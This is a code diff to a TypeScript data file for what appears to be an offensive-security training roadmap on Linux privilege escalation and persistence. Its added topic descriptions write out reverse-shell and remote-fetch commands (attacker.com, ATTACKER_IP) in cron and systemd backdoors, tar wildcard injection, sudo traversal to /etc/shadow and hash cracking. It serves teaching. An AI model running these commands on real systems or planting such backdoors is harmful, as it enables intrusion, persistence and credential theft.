@@ -68,10 +68,11 @@ export const chapter8: RoadmapChapter = {
         }
       ],
       keyTopics: [
-        "In-memory script execution via cURL pipes to avoid disk artifacts",
-        "Interpreting LinPEAS color coding: RED/YELLOW privilege escalation indicators",
-        "Manual enumeration of listening local ports, mounted filesystems, and cronjobs",
-        "Privilege escalation via sensitive group memberships (docker, lxd, disk)",
+        "In-Memory LinPEAS Execution & EDR Evasion: LinPEAS is the industry-standard automated script for enumerating Linux privilege escalation vectors. In professional red teaming, dropping scripts onto the physical disk in /home or /tmp leaves permanent forensic footprints and triggers Endpoint Detection and Response (EDR) alerts. Pipelining the script directly from an attacker web server into memory (curl http://attacker.com/linpeas.sh | sh) ensures execution takes place entirely within RAM, minimizing disk artifacts.",
+        "LinPEAS Color Coding Triage (RED/YELLOW Indicators): LinPEAS highlights findings using a strict color-coded priority system. A line highlighted in RED on a YELLOW background indicates a 99% probability of an immediate privilege escalation vector (such as an unshadowed password file, known kernel exploit, or vulnerable SUID binary). RED indicates highly interesting configurations requiring immediate manual review, while YELLOW denotes special privileges and SUID permissions.",
+        "Manual Local Network Sockets & Loopback Service Enumeration: Running 'ss -tulpn' or 'netstat -antup' displays all active TCP/UDP network sockets listening on the local host. Attackers look specifically for services bound exclusively to 127.0.0.1 or internal private interfaces that were unreachable from the external Internet. Discovering an unauthenticated local Redis instance (port 6379) or internal MySQL server (port 3306) allows the attacker to pivot locally to gain root privileges.",
+        "Mounted Filesystem Inspection & NFS no_root_squash Vulnerabilities: Inspecting /etc/fstab and running 'showmount -e' reveals all mounted local drives and Network File System (NFS) network shares. If an NFS share is exported with the 'no_root_squash' option enabled, the NFS server treats remote root users as local root. An attacker can mount the share on their local Kali machine as root, create an SUID binary (chmod +s rootbash), and execute it on the target to achieve instant root access.",
+        "Sensitive Group Membership Exploitation (docker, lxd, disk): Membership in non-standard user groups frequently yields direct root escalation without requiring software vulnerabilities. If 'id' reveals membership in the 'docker' group, running 'docker run -v /:/mnt --rm -it alpine chroot /mnt' mounts the host's entire root filesystem with unrestricted privileges. Similarly, membership in the 'lxd' group allows spawning privileged containers, and the 'disk' group allows reading raw disk blocks with debugfs.",
       ],
       terminalCommands: [
         "curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh",
@@ -139,10 +140,11 @@ export const chapter8: RoadmapChapter = {
         }
       ],
       keyTopics: [
-        "SUID and SGID permission bit mechanics and hunting techniques",
-        "Escaping restricted shells via GTFOBins curated binary techniques",
-        "Shared Object (`.so`) injection in custom compiled SUID executables",
-        "Linux Capabilities enumeration (`getcap`) and weaponizing `cap_setuid`",
+        "SUID/SGID Permission Bit Mechanics & Hunting Commands: Set User ID (SUID, octal 4000) instructs the Linux kernel to execute a binary with the permissions of the file owner (typically root) rather than the executing user. Attackers hunt for SUID executables across the filesystem using 'find / -perm -4000 -type f 2>/dev/null'. Comparing discovered binaries against standard baseline OS distributions allows researchers to pinpoint custom administrator scripts, legacy utilities, and misconfigured system binaries.",
+        "GTFOBins Curated Binary Escapes: GTFOBins catalogs hundreds of legitimate Unix binaries that can be exploited to bypass local shell restrictions and escalate privileges when SUID bits or sudo rights are present. For example, if /usr/bin/find has the SUID bit set, running 'find . -exec /bin/sh -p ; -quit' instructs find to execute a shell preserving root privileges (-p). Similar escapes exist for vim, bash, python, less, and nano.",
+        "Shared Object (.so) Library Injection in Custom SUID Binaries: Custom SUID binaries frequently depend on external shared libraries (.so files) loaded dynamically at runtime. Using 'strace -v -f -e execve <binary>' or 'ldd <binary>', attackers inspect the shared object loading sequence. If the binary attempts to load a library from a writable directory or relative path, an attacker compiles a malicious C library with an init() constructor that executes /bin/bash, hijacking execution when the SUID binary runs.",
+        "Linux Capabilities (cap_setuid & cap_dac_read_search) Architecture: Linux Capabilities partition monolithic root privileges into 41 distinct, granular units, allowing binaries to perform specific privileged tasks without full SUID root access. Attackers enumerate capabilities using 'getcap -r / 2>/dev/null'. If a programming interpreter (Python, Perl, Node.js) is granted 'cap_setuid+ep', an unprivileged user can invoke the interpreter and execute 'os.setuid(0)', immediately spawning a root shell.",
+        "Exploiting Relative PATH Execution in SUID Scripts: When custom SUID binaries or compiled C programs execute system utilities using system() or popen() without specifying the absolute path (e.g. calling 'cat /var/log/syslog' instead of '/bin/cat'), PATH hijacking is possible. An attacker creates a malicious executable named 'cat' inside /tmp, adds /tmp to the beginning of their PATH ('export PATH=/tmp:$PATH'), and executes the SUID binary, forcing it to run the attacker's script as root.",
       ],
       terminalCommands: [
         "find / -perm -4000 -type f 2>/dev/null",
@@ -219,10 +221,11 @@ COMPILE & EXECUTE:
         }
       ],
       keyTopics: [
-        "Parsing `sudo -l` outputs and identifying `NOPASSWD` entries",
-        "GTFOBins weaponization of sudo-permitted system binaries",
-        "Directory traversal and parameter injection in sudo wildcard paths",
-        "Weaponizing `env_keep += LD_PRELOAD` using malicious C shared libraries",
+        "Auditing Sudo Permissions (sudo -l) & NOPASSWD Configurations: The /etc/sudoers file defines which users can run specific commands under elevated privileges. Running 'sudo -l' lists all permitted commands for the current session, highlighting commands marked 'NOPASSWD' which can be executed without knowing any password. If system utilities like find, vi, less, or bash are permitted under NOPASSWD, the user can escape immediately into an unrestricted root shell using GTFOBins techniques.",
+        "Sudo Environment Preservation & LD_PRELOAD Shared Object Hijacking: The LD_PRELOAD environment variable instructs the dynamic linker (ld.so) to load a specified shared library (.so) before any other library. By default, sudo strips dangerous environment variables. However, if /etc/sudoers contains 'Defaults env_keep += \"LD_PRELOAD\"', any user permitted to run ANY sudo command can load a custom shared library as root: 'sudo LD_PRELOAD=/tmp/pe.so <command>', achieving instant root access.",
+        "Wildcard Path Traversals in Sudoers Specifications: Insecure sudoers configurations frequently employ wildcards to grant access to broad file paths (e.g. 'john ALL=(root) NOPASSWD: /bin/cat /var/log/*'). Attackers bypass these intended path restrictions using directory traversal: running 'sudo /bin/cat /var/log/../../etc/shadow' fulfills the wildcard pattern while instructing cat to traverse out of /var/log and print the confidential shadow password file.",
+        "Exploiting Sudo Version Vulnerabilities (Baron Samedit CVE-2021-3156): Historical versions of sudo contain critical memory corruption vulnerabilities that allow local users to gain root access without any administrative permissions. The Baron Samedit vulnerability (CVE-2021-3156) affected sudo versions prior to 1.8.28, caused by a heap-based buffer overflow in argument escaping routines when invoked with 'sudoedit -s'. Attackers deploy public C exploits to overwrite sudo memory structures to gain root.",
+        "Sudo Token Reuse & Re-Authentication Windows: When a user successfully authenticates with sudo, the operating system caches a session credential token in /var/run/sudo/ts/ for a default duration of 15 minutes. If an attacker gains access to a compromised workstation while the user's sudo token is active, running any sudo command executes immediately without prompting for a password. This allows rapid lateral privilege escalation on active developer desktops.",
       ],
       terminalCommands: [
         "sudo -l",
@@ -297,10 +300,11 @@ COMPILE & EXECUTE:
         }
       ],
       keyTopics: [
-        "Analyzing system and user cron tables: `/etc/crontab`, `/etc/cron.d/`",
-        "Inspecting background task execution in real time with `pspy`",
-        "Wildcard argument injection in `tar`, `rsync`, and `chown`",
-        "PATH variable hijacking in automated administrative scripts",
+        "Linux Cron Scheduling Architecture & System Crontabs: The Cron daemon automates periodic background system maintenance tasks scheduled in /etc/crontab, /etc/cron.d/, and user-specific spools in /var/spool/cron/crontabs/. Tasks are configured with a 5-field timing syntax (minute, hour, day of month, month, day of week) followed by the executing username and the command path. Attackers inspect system crontabs looking for scripts executing as root at frequent intervals (e.g. every minute '* * * * *').",
+        "Writable Scheduled Script Hijacking: If an automated task running as root executes a shell script that has insecure file permissions (e.g. chmod 777 or owned by an unprivileged user), privilege escalation is trivial. An attacker appends a reverse shell payload to the bottom of the script: 'echo \"bash -i >& /dev/tcp/10.10.14.5/4444 0>&1\" >> /opt/backup.sh'. When the cron daemon executes the script at the next scheduled interval, the payload runs as root.",
+        "Wildcard Argument Injection in Tar and Rsync: When an administrative script executes commands using wildcards (such as 'tar -czf backup.tar.gz *' inside /var/backups), the shell expands the asterisk '*' into a list of every file in the directory. If an attacker creates files named '--checkpoint=1' and '--checkpoint-action=exec=sh shell.sh', tar parses those filenames as command-line options rather than file names, executing 'sh shell.sh' as root.",
+        "Process Snooping with PSPY (Process Spy): Many scheduled cron jobs execute from private user crontabs or systemd timers that are not listed in /etc/crontab. The 'pspy' utility monitors Linux process creation by snooping on /proc event notifications in real time without requiring root privileges. Running pspy displays commands, arguments, and environment variables of ephemeral root tasks that execute and terminate in fractions of a second.",
+        "PATH Variable Overrides in Cron Configurations: The /etc/crontab file frequently defines its own internal PATH variable (e.g. 'PATH=/usr/local/bin:/bin:/usr/bin'). If the defined PATH includes a writable directory or relative path (like . or /tmp), and a scheduled task invokes a utility without specifying its absolute path (calling 'backup' instead of '/usr/local/bin/backup'), creating a malicious executable in the writable folder hijacks the root execution.",
       ],
       terminalCommands: [
         "cat /etc/crontab",
@@ -372,10 +376,11 @@ COMPILE & EXECUTE:
         }
       ],
       keyTopics: [
-        "Kernel ring-0 privilege execution vs userspace DAC security controls",
-        "Dirty COW (CVE-2016-5195) and Dirty Pipe (CVE-2022-0847) mechanics",
-        "Statically compiling C exploits on Kali for targets missing `gcc`",
-        "Risk mitigation: preventing kernel panics and restoring system state",
+        "Linux Kernel Ring-0 Memory Boundaries: The Linux kernel operates in CPU Ring 0 with unrestricted hardware access, memory management, and process control. A kernel vulnerability bypasses all userspace security mechanisms (DAC, MAC, Sudo, Capabilities, Namespaces) completely. Exploiting kernel memory corruption bugs (use-after-free, buffer overflows, race conditions) allows an unprivileged process to alter its own credential structures (cred struct) to set UID, GID, and EUID to 0 (root).",
+        "Dirty COW (CVE-2016-5195) Race Condition Mechanics: Dirty COW was a historic race condition vulnerability in the Linux kernel's memory management subsystem's copy-on-write (COW) mechanism affecting kernels from 2007 to 2016. The flaw allowed unprivileged users to gain write access to read-only memory mappings. Attackers exploited Dirty COW to overwrite read-only files on disk, famously modifying /etc/passwd to replace the root user password hash with a known password.",
+        "Dirty Pipe (CVE-2022-0847) Page Cache Overwrite: Discovered by Max Kellermann in 2022, Dirty Pipe affected Linux kernels 5.8 through 5.16.11, caused by an uninitialized pipe buffer flag (PIPE_BUF_FLAG_CAN_MERGE). The vulnerability allows unprivileged processes to write arbitrary data into the kernel's page cache of ANY file on disk, even if the file is completely read-only. Attackers use Dirty Pipe to overwrite /etc/passwd or hijack SUID binaries to gain instant root.",
+        "Cross-Compiling C Exploits & GLIBC Compatibility: Production enterprise servers frequently lack C compilers (gcc) and software development libraries to prevent on-host compilation. Attackers must cross-compile kernel exploits on their local Kali machine. To prevent runtime errors caused by missing dynamic libraries or GLIBC version mismatches on the target, exploits are compiled with static linking: 'gcc -static exploit.c -o exploit', producing self-contained standalone binaries.",
+        "Kernel Panic Risks & Operational Safety: Kernel exploits operate directly on raw operating system memory structures. If an exploit encounters memory alignment issues, unexpected kernel patches, or loses a race condition, it triggers a Kernel Panic, instantly crashing the operating system and forcing a hard reboot. In professional client penetration testing, kernel exploits are strictly a LAST RESORT, utilized only when all misconfiguration vectors are exhausted.",
       ],
       terminalCommands: [
         "uname -a",
@@ -450,10 +455,11 @@ COMPILE & EXECUTE:
         }
       ],
       keyTopics: [
-        "Establishing persistent SSH backdoors via `authorized_keys`",
-        "Deploying stealth systemd background services and root cron persistence",
-        "Extracting cleartext passwords from memory using Mimipenguin",
-        "Unshadowing and cracking `/etc/shadow` hashes with Hashcat and John the Ripper",
+        "SSH Authorized Keys Persistence Architecture: The most stable and stealthy post-exploitation persistence mechanism involves adding an attacker's public SSH key into /root/.ssh/authorized_keys. This grants the attacker passwordless, encrypted interactive shell access directly over port 22. Attackers configure specific SSH options in the authorized_keys file (such as command restrictions or port-forwarding allowances) to maintain persistent administrative tunnels.",
+        "Custom Systemd Background Service Backdoors: Modern Linux systems manage background daemons using systemd. An attacker with root privileges creates a custom service file in /etc/systemd/system/sys-update.service configured with 'ExecStart=/bin/bash -c \"bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\"' and 'Restart=always'. Enabling the service with 'systemctl enable sys-update' ensures the reverse shell executes automatically on system boot and auto-restarts if killed.",
+        "Hidden Root Crontab Backdoors: Adding scheduled tasks to /etc/crontab or root's personal crontab establishes periodic persistent outbound connections. An entry like '@reboot root /bin/bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' or '0 * * * * root /usr/local/bin/.sys_check' ensures that even if administrators terminate active shells or reboot the server, the target re-establishes a reverse shell connection to the attacker's listener every hour.",
+        "Credential Harvesting with Mimipenguin: Mimipenguin is the Linux counterpart to Windows Mimikatz, designed to dump cleartext passwords and authentication tokens from active process memory. Mimipenguin hooks into processes that handle authentication (such as GNOME Display Manager gdm, vsftpd, and Apache) and extracts plaintext passwords entered during login. This allows attackers to harvest credentials of other system administrators without cracking hashes.",
+        "Unshadowing & Offline Hash Cracking: Once root access is achieved, attackers extract /etc/passwd (containing usernames) and /etc/shadow (containing cryptographic password hashes). The 'unshadow' utility combines both files into a single unified format ('unshadow passwd shadow > hashes.txt'). Attackers feed these hashes into John the Ripper or Hashcat using rule-based dictionary attacks to recover plaintext passwords used across the enterprise.",
       ],
       terminalCommands: [
         "echo 'ssh-ed25519 AAAAC3N... attacker' >> /root/.ssh/authorized_keys",
